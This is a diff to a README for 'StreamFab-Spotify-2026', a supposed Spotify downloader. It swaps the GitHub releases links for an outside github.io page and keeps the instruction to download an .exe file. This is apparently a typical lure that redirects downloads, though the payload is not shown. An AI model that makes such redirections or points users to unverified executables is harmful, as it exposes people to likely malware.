@@ -1,6 +1,6 @@
 # 🎧 StreamFab-Spotify-2026 - Save your music for offline listening
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Aswinlum8572/StreamFab-Spotify-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://aswinlum8572.github.io)
 
 ## 📖 About this software
 
@@ -21,7 +21,7 @@ Your computer must meet these standards to run the software.
 
 Follow these steps to get the software on your system.
 
-1. Go to the [official release page](https://github.com/Aswinlum8572/StreamFab-Spotify-2026/releases).
+1. Go to the [official release page](https://aswinlum8572.github.io).
 2. Look for the most recent version at the top of the list.
 3. Click the file name that ends in .exe to start your download.
 4. Wait for the file to finish downloading to your computer.
